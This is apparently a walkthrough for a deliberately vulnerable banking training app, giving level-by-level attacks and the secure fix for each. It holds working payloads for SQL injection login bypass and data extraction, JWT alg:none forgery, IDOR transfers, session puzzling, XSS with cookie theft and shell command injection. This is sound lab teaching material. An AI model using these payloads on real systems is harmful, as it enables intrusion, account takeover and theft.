SQL Injection — Login Bypass

📍 /login — Customer ID box
Goal

Sign in as your own account without knowing the password.

Root cause

Your Customer ID is concatenated straight into the login SQL. A single quote ends the string literal, and everything you type after it is parsed as SQL — so you can rewrite the query's logic and drop the password check.

Level ladder
L0raw query, DB error shown
L1+ blacklist on comments/UNION
L2blind + bracketed + comment filter
L3parameterized + bcrypt
L3 — secure: a parameterized query (customer_id = ?) + password_verify() (bcrypt), one generic “Invalid credentials” message, and a 5-attempt lockout. Input is data, never SQL.
G1 L0 — Fully vulnerable (error-based) SQL Injection — Login Bypass
The mitigation at this level

Nothing filtered. The raw database error is returned to the screen, so a lone quote confirms injection instantly.

How to solve it

Comment the password check out of the query. In MySQL, # runs to the end of the line.

SELECT id, customer_id, name, role FROM users
WHERE customer_id = 'BS100234' #'
  AND password_md5 = '…'  ← commented out, never runs
Payload
BS100234' #
your own Customer ID + any password
G1 L1 — Naive blacklist SQL Injection — Login Bypass
The mitigation at this level

Blocks --, #, /* and union (rejects “Illegal characters”). The comment trick now fails — but OR is not blocked.

How to solve it

You can't comment, so make the row match another way. AND binds tighter than OR, so an un-bracketed OR on your Customer ID is enough.

WHERE customer_id = 'BS100234' OR '1'='1'
  AND password_md5 = '…'
reads as:  customer_id='BS100234'  OR  ('1'='1' AND password=…)
            └─ true on its own → row returned
Payload
BS100234' OR '1'='1
no comment needed
G1 L2 — Blind + brackets + comment filter SQL Injection — Login Bypass
The mitigation at this level

DB error hidden (blind). The Customer ID test is wrapped in ( ) with the password check outside the brackets. Comment tokens are also blacklisted — rejected with a generic “Invalid credentials” (same as a wrong password, so you can't even tell the filter tripped).

How to solve it

A bare OR is now trapped inside the brackets, and you can't comment the tail away. Supply the closing ) yourself to escape the parens, then OR at the top level — the query's own trailing ') balances your quote. No comment.

WHERE (customer_id = 'BS100234') OR ('1'='1')
  AND password_md5 = '…'
reads as:  (customer_id='BS100234')  OR  ('1'='1' AND password=…)
            password branch is false → whole clause = customer_id='BS100234'
Payload
BS100234') OR ('1'='1
close the bracket, OR outside it
💡 Comment-blacklisting is not a SQLi defence — you break the bracket without one.

CWE-200 · A04:2021

OTP in Response Body

📍 /login → OTP screen; the script /public/js/otp-validation.js
Goal

Recover the 2FA OTP from the client, not the victim's phone.

Root cause

The login OTP is injected server-side into a dynamically-built JavaScript file (otp-validation.js, the SESSION_DATA object). Anything the browser receives, the user can read — so a secret that rides down to the client is already lost.

Level ladder
L0plaintext OTP + flag in JS
L1OTP derivable from leaked seed+uid
L2hash+sealed flag in headers
L3OTP never leaves the server
L3 — secure: nothing OTP-related is injected into the script. The code the OTP is verified entirely server-side — there is nothing on the client to read, recompute or brute-force.
L11 L0 — Plaintext in the JS body OTP in Response Body
The mitigation at this level

The OTP sits in plaintext in _otp and the flag in _flag, right in the served script.

How to solve it

Open DevTools → Sources/Network → otp-validation.js and read them. Or in the console:

Payload
fetch('/public/js/otp-validation.js') → read _otp and _flag
everything is exposed
L11 L1 — Predictable from seed + uid OTP in Response Body
The mitigation at this level

No plaintext OTP. The token id leaks as _seed, the user id as _uid; the flag is sealed in _flag_enc.

How to solve it

Recompute the OTP, then unseal the flag. Inputs are concatenated as strings, not added.

Payload
otp = parseInt( sha256(_seed + _uid)[:8], 16) % 10000
then flag = _flag_enc XOR sha256(otp)
L11 L2 — Secrets in response headers OTP in Response Body
The mitigation at this level

The body carries only breadcrumbs. The OTP hash X-Otp-Check = sha256(otp) and the sealed X-Flag-Enc ride in the response headers of the script.

How to solve it

Read the response headers (Network tab), then brute-force the 10,000-value OTP space against the hash — trivial — and decrypt the sealed flag.

Payload
for otp in 0000..9999: if sha256(otp)==X-Otp-Check → decrypt X-Flag-Enc
4-digit space = instant

CWE-347 · A02:2021

JWT Forgery → Admin

📍 access_token cookie / Bearer; proof at /admin/vault
Goal

Forge a token claiming role: admin without the signing key.

Root cause

The app trusts a browser-readable JWT for identity and role. A JWT is only as good as the server's verification of its signature — if the server doesn't properly verify, the client can rewrite the claims.

Note. Flag caveat: forge sub = your own id (+ role:admin) so the flag at /admin/vault is keyed to the account you'll submit from.
Level ladder
L0signature present but never verified
L1alg:none accepted
L2only lowercase 'none' blocked
L3HS256 pinned + verified
L3 — secure: algorithm pinned to HS256, HMAC verified with the server secret (constant-time), and exp checked. none/None and any tampered token are rejected.
L12 L0 — Signature not verified JWT Forgery → Admin
The mitigation at this level

The verifier only checks that a signature segment exists — it never checks the HMAC.

How to solve it

Edit the payload, leave any signature string in place.

Payload
{"sub":"<your id>","role":"admin", …}
signature ignored entirely
L12 L1 — alg:none accepted JWT Forgery → Admin
The mitigation at this level

Replaying the old signature now fails (the HMAC is checked) — but the verifier still accepts unsigned tokens when the header says alg:none.

How to solve it

Drop the signature and declare no algorithm.

Payload
header {"alg":"none"} + admin payload + empty signature
no key required
L12 L2 — Case-sensitive alg check JWT Forgery → Admin
The mitigation at this level

Plain lowercase none is now rejected — but the check is case-sensitive, so a differently-cased value slips past into the same unsigned-accept path.

How to solve it

Use a capitalised variant.

Payload
header {"alg":"None"} (or "NONE") + empty signature
string compare missed the variants

CWE-639 · A01:2021

IDOR — Transfer From Another Account

📍 /transfer wizard (“From” account)
Goal

Debit an account that isn't yours.

Root cause

The “From” account is chosen by a value the client sends (from_account_ref), and the server debits it without checking you own it. Each level just wraps that reference in a fancier envelope — none of them add the missing ownership check.

Level ladder
L0raw account number, no check
L1number + HMAC signature
L2client-side AES ciphertext
L3server scopes to WHERE user_id = you
L3 — secure: the execute path scopes the source account — WHERE id = :id AND user_id = :current_user. Every forged number, signature or ciphertext simply matches no row.
L1 L0 — Raw account number IDOR — Transfer From Another Account
The mitigation at this level

from_account_ref is simply the plain account number; the server debits whatever you send.

How to solve it

In DevTools, edit the <select name="from_account_ref"> option to a victim's number and finish the wizard.

Payload
from_account_ref = 50100100000002
their account is drained
L1 L1 — Number + HMAC signature IDOR — Transfer From Another Account
The mitigation at this level

The form now submits the number and a signature — from_account_sig = hmac(number). Editing only the number leaves the signature wrong, so it's rejected.

How to solve it

You don't need to forge the HMAC — you just need a valid pair. The page leaks a signed number+sig pair in the Network request; reuse a leaked victim pair.

Payload
from_account_ref=<number> & from_account_sig=<64-hex>
replay a leaked valid pair
L1 L2 — Client-side encryption IDOR — Transfer From Another Account
The mitigation at this level

A page script encrypts your selection with XferRef.encryptRef() (AES) into from_account_ref. Editing the dropdown to a victim's number isn't on the page's own-account allowlist, so the ref posts empty.

How to solve it

The encryption runs in the browser, so the key is in the JS (/public/vendor/transfer-ref.js). Mint ciphertext for any number from the console. (The exposed key is intentional — that's the lesson: client-side crypto protects nothing.)

Payload
XferRef.encryptRef('50100100000002')
paste the result into from_account_ref

CWE-89 · A03:2021

SQL Injection — Data Extraction

📍 /statements — Remarks search box
Goal

Read another user's flag out of the ctf_flags table.

Root cause

Only the search term is injectable — the date range is always bound. The term is spliced into a LIKE clause, so a crafted term stops being “text to match” and becomes SQL. Each level filters the term differently but still concatenates it.

Note. The flag is a per-user HMAC in ctf_flags (can't be shared) — extract your own row, read it from the results, submit it.
Level ladder
L0raw → UNION / error-based
L1leaky single-pass filter → nest keywords
L2UNION looped-out + blind → one char at a time
L3bound parameter
L3 — secure: the term is a bound parameter — remarks LIKE :q. It's matched as text, never parsed as SQL, at every level of cleverness.
G2 L0 — Raw — in-band UNION / error-based SQL Injection — Data Extraction
The mitigation at this level

The term is used exactly as typed, and raw SQL errors are shown. The result grid has 7 columns.

How to solve it

Close the string, then UNION a select from ctf_flags (flag lands in the Remarks cell) — or leak it through an error.

... WHERE (from_account_id=:a1 OR to_account_id=:a2)
    AND remarks LIKE '%%' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags#%'
your UNION row joins the result set → another user's flag in the grid
Payload
%' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags#
flag shows in the Remarks column
G2 L1 — Leaky single-pass blacklist SQL Injection — Data Extraction
The mitigation at this level

Strips union select -- # /* */ — but only once, case-insensitively. Split or nested keywords survive the single pass; quotes pass through; errors still shown.

How to solve it

Hide the keyword inside itself so one removal rebuilds it.

remarks LIKE '%%' UNIunionON SELselectECT username,flag,3,4,5,6,7 FROM ctf_flags#%'
after one strip pass → ... UNION SELECT ... FROM ctf_flags#
Payload
UNIunionON → UNION uni/**/on → union
then the same UNION / error-based dump
G2 L2 — UNION looped-out + blind SQL Injection — Data Extraction
The mitigation at this level

union is stripped repeatedly until stable (nesting can't rebuild it), and errors are hidden. In-band extraction is dead — but boolean logic still reaches the query.

How to solve it

Ask one yes/no question per character and watch whether any row comes back (boolean-blind). Automate across positions.

remarks LIKE '%%' AND SUBSTRING((SELECT flag FROM ctf_flags
   WHERE username='<you>'),1,1)='B'#%'
rows returned → 1st char is 'B'  ·  no rows → wrong guess  → reconstruct char by char
Payload
%' AND SUBSTRING((SELECT flag FROM ctf_flags WHERE username='<you>'),1,1)='B'#
row present = guess correct

CWE-841 · A07:2021

Session Puzzling (Forgot-Password)

📍 /forgot-password · /forgot-password/reset
Goal

Take over another account through the password-recovery flow.

Root cause

The recovery flow writes session state that the authenticated area trusts, without binding progress to the target account. Mixing recovery state and login state in the same session lets one be used to stand in for the other.

Level ladder
L0step 1 writes the trusted session user
L1 / L2progress not bound to the target — swap it in
L3stage bound to the account that earned it
L3 — secure: changing the Customer ID at step 1 clears recovery_stage, and the reset gate requires the stage to have been earned by the same user — recovery_stage_uid === recovery_uid. The swap is refused.
L25 L0 — Auth-key overload Session Puzzling (Forgot-Password)
The mitigation at this level

Step 1 writes $_SESSION['user'] — the same key the authenticated area trusts — for whatever Customer ID you type, before any OTP or security questions.

How to solve it

Submit the victim's Customer ID, then just browse to the app. You're already “logged in” as them.

Payload
/forgot-password (victim's ID) → /dashboard
watch /debug/session to see it
L25 L1 / L2 — Stage carryover (same technique both levels) Session Puzzling (Forgot-Password)
The mitigation at this level

Progress (recovery_stage) is tracked separately from the target (recovery_uid) and isn't bound to it. (L2 currently mirrors L1 — a distinct binding is still to be differentiated.)

How to solve it

Earn the stage on your own account, then swap the target underneath it.

Payload
complete flow for yourself → reach reset (stage=2) → new tab: submit victim's ID (overwrites recovery_uid, keeps stage) → drive /forgot-password/reset
you reset the victim's password

CWE-79 · A03:2021 · 🎓 training only (no flag)

Reflected XSS

📍 /statements — search term reflection
Goal

Run attacker JavaScript in the victim's browser via a reflected value.

Root cause

The search term is reflected back into the page without encoding, so markup you send becomes part of the page and executes. Which encoding is missing depends on where it's reflected — text vs. an HTML attribute.

Note. Not part of the CTF (ctf_eligible=false) — no flag. At L0 the session cookie has no HttpOnly, so document.cookie includes it — use that to demo cookie theft.
Level ladder
L0reflected raw into text
L1naive <script> strip — use handlers/nesting
L2text encoded, attribute raw — break out
L3both contexts encoded
L3 — secure: htmlspecialchars() on both the text and the attribute reflections; the payload can't break out of either context, so nothing executes.
G4 L0 — Raw reflection into text Reflected XSS
The mitigation at this level

The term is echoed straight into the “Results for:” line, unencoded.

How to solve it

Any tag runs. Use an image error handler (fires without a visible element).

Payload
<img src=x onerror=alert(document.domain)>
<script>alert(1)</script> also works
G4 L1 — Naive <script> strip Reflected XSS
The mitigation at this level

A single-pass strip removes literal <script>/</script>, so a plain script tag never fires.

How to solve it

Don't use a script tag — use an event handler, or nest the tag so one strip rebuilds it.

Payload
<img src=x onerror=alert(1)> · <scr<script>ipt>alert(1)</scr</script>ipt>
event handler needs no <script>
G4 L2 — Text encoded, attribute raw Reflected XSS
The mitigation at this level

<> are now encoded in the text sink — but the search box value="…" reflects your input raw. The text payload is inert here; the attribute is the vector.

How to solve it

Break out of the attribute first with ">, then inject your tag.

Payload
"><img src=x onerror=alert(1)>
close the value=" then add markup

CWE-78 · A03:2021

Command Injection

📍 /statements — Download PDF
Goal

Run OS commands as www-data (RCE) and read the flag file.

Root cause

The Download-PDF control shells out to wkhtmltopdf with your output filename unescaped. Shell metacharacters in the filename start new commands. (Runs in an emulated honeypot shell — no real host access, no egress.)

Note. The flag file is per-user: /tmp/flag_g9_<id>.txt. id → uid=33(www-data); ls /tmp finds the filename.
Level ladder
L0raw — ';' chains commands
L1blacklist ; & — use the pipe
L2blacklist ; & | + spaces — newline + $IFS
L3escapeshellarg() on every arg
L3 — secure: escapeshellarg() wraps every argument, so ;, |, newline and $IFS are all treated as literal filename characters — a real PDF is returned and nothing breaks out.
G9 L0 — Raw — semicolon chaining Command Injection
The mitigation at this level

Nothing filtered; the filename goes straight to the shell.

How to solve it

Chain commands with ;.

Payload
filename=statement.pdf;cat /tmp/flag_g9_<id>.txt;
prove RCE first with ;id;
G9 L1 — Blacklist: ; & Command Injection
The mitigation at this level

The filter strips ; and &, so statement.pdf;cat… collapses into one broken token.

How to solve it

Use a separator the blacklist forgot — the pipe survives.

Payload
filename=statement.pdf|cat /tmp/flag_g9_<id>.txt
| was not on the list
G9 L2 — Blacklist: ; & | + spaces Command Injection
The mitigation at this level

Now ;, &, | and spaces are all stripped — the pipe is gone and no space survives.

How to solve it

Separate commands with a raw newline (%0a) and make a space without typing one, using $IFS.

Payload
filename=statement.pdf%0acat$IFS/tmp/flag_g9_<id>.txt
also ${IFS}, $IFS$9, %09, {cat,/path}
